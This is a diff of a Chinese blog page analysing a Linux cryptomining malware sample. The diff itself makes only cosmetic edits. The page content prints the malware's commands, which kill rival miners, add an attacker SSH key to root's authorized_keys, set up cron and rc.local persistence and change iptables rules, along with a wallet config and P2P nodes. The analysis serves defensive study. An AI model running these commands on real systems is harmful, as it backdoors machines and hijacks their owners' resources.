@@ -47,7 +47,7 @@
 				<nav class="site-nav hide-in-mobile">
 					
 				<a href="https://www.a1ee.cn/basic/">BASIC</a>
-				<a href="https://www.a1ee.cn/simaple/">SIMAPLE</a>
+				<a href="https://www.a1ee.cn/simple/">SIMPLE</a>
 				<a href="https://www.a1ee.cn/medium/">MEDIUM</a>
 				<a href="https://www.a1ee.cn/about-me/">ABOUT</a>
 
@@ -61,7 +61,7 @@
 	<div id="mobile-menu" class="animated fast">
 		<ul>
 			<li><a href="https://www.a1ee.cn/basic/">BASIC</a></li>
-			<li><a href="https://www.a1ee.cn/simaple/">SIMAPLE</a></li>
+			<li><a href="https://www.a1ee.cn/simple/">SIMPLE</a></li>
 			<li><a href="https://www.a1ee.cn/medium/">MEDIUM</a></li>
 			<li><a href="https://www.a1ee.cn/about-me/">ABOUT</a></li>
 		</ul>
@@ -82,7 +82,7 @@
 <p><img src="/workminer_images/2436651160000.png" alt=""></p>
 <h2 id="脱壳">脱壳<a href="#脱壳" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p>使用<code>upx3.93</code>脱壳失败，提示：</p>
-<pre><code>upx: work64: CantUnpackException: p_info corrupted
+<pre tabindex="0"><code>upx: work64: CantUnpackException: p_info corrupted
 </code></pre><p>使用文本标记其查看二进制文件，发现<code>p_info</code>被修改了：</p>
 <p><img src="/workminer_images/2446734175295.png" alt=""></p>
 <p>从末尾找到文件大小：</p>
@@ -98,7 +98,7 @@
 <p>执行命令终止其他挖矿进程</p>
 <p><img src="/workminer_images/980700198976.png" alt=""></p>
 <p>命令列表如下：</p>
-<pre><code>ps -ef | grep ddg | grep -v grep | awk '{print $2}' | xargs kill -9
+<pre tabindex="0"><code>ps -ef | grep ddg | grep -v grep | awk '{print $2}' | xargs kill -9
 ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
 ps -ef | grep tcp: | grep -v grep | awk '{print $2}' | xargs kill -9
 ps -ef | grep x86_ | grep -v grep | awk '{print $2}' | xargs kill -9
@@ -122,7 +122,7 @@ ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs 
 <p>生成配置文件：<code>/tmp/config.json</code></p>
 <p><img src="/workminer_images/4658020187658.png" alt=""></p>
 <p>配置文件内容如下（其中包含了挖矿钱包）：</p>
-<pre><code>{
+<pre tabindex="0"><code>{
 	&quot;api&quot;: {
 		&quot;id&quot;: null,
 		&quot;worker-id&quot;: null
@@ -201,7 +201,7 @@ ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs 
 <p>生成<code>/tmp/secure.sh</code>脚本并添加可执行权限：</p>
 <p><img src="/workminer_images/5877555184733.png" alt=""></p>
 <p>脚本内容如下：</p>
-<pre><code>#!/bin/bash
+<pre tabindex="0"><code>#!/bin/bash
 
 LIMIT=8
 while true ; do
@@ -221,7 +221,7 @@ done
 </code></pre><p>生成<code>/tmp/auth.sh</code>脚本并添加可执行权限：</p>
 <p><img src="/workminer_images/141357180984.png" alt=""></p>
 <p>脚本内容如下：</p>
-<pre><code>#!/bin/bash
+<pre tabindex="0"><code>#!/bin/bash
 
 LIMIT=8
 while true ; do
@@ -248,26 +248,26 @@ done
 <p>生成<code>/root/.ssh/authorized_keys</code>，设置权限为<code>600</code>，并使用<code>echo</code>写入内容：</p>
 <p><img src="/workminer_images/5574831203213.png" alt=""></p>
 <p>写入公钥命令为：</p>
-<pre><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&quot; &gt;&gt; /root/.ssh/authorized_keys
+<pre tabindex="0"><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&quot; &gt;&gt; /root/.ssh/authorized_keys
 </code></pre><p>检测是否存在以下文件：</p>
-<pre><code>/etc/rc.d/rc.local
+<pre tabindex="0"><code>/etc/rc.d/rc.local
 /etc/rc.local
 /etc/rc.conf
 /etc/crontab
 </code></pre><p><img src="/workminer_images/1157936208252.png" alt=""></p>
 <p>检测是否存在以下文件：</p>
-<pre><code>/var/spool/cron/root
+<pre tabindex="0"><code>/var/spool/cron/root
 /var/spool/cron/crontabs
 </code></pre><p><img src="/workminer_images/1021943209547.png" alt=""></p>
 <p>附加文件：</p>
-<pre><code>/var/spool/cron/root
+<pre tabindex="0"><code>/var/spool/cron/root
 /var/spool/cron/crontabs/root
 </code></pre><p><img src="/workminer_images/4794654210549.png" alt=""></p>
 <h3 id="修改防火墙规则">修改防火墙规则<a href="#修改防火墙规则" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>执行命令，修改防火墙规则：</p>
 <p><img src="/workminer_images/5133802220726.png" alt=""></p>
 <p>修改命令如下：</p>
-<pre><code>iptables -I INPUT  -p tcp --dport
+<pre tabindex="0"><code>iptables -I INPUT  -p tcp --dport
 iptables -I OUTPUT -p tcp --sport
 iptables -I POSTROUTING -t nat -p tcp --sport
 iptables -I PREROUTING  -t nat -p tcp --dport
@@ -323,7 +323,7 @@ iptables -I POSTROUTING -t nat -p udp --sport %d -j ACCEPT
 <p>进入其中可以看到明显的<code>socket</code>、<code>bind</code>函数：</p>
 <p><img src="/workminer_images/3633214122380.png" alt=""></p>
 <p>外联过程分析结束，链接分析如下：</p>
-<pre><code>P2P节点如下：
+<pre tabindex="0"><code>P2P节点如下：
 router.bittorrent.com:6881
 bttracker.debian.org:6881
 router.utorrent.com:6881
@@ -377,7 +377,7 @@ dht.transmissionbt.com:6881
 	</main>
 
 	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-		<p>&copy; 2021 <a href="https://www.a1ee.cn">alee</a></p>
+		<p>&copy; 2022 <a href="https://www.a1ee.cn">alee</a></p>
 	</footer>
 
 
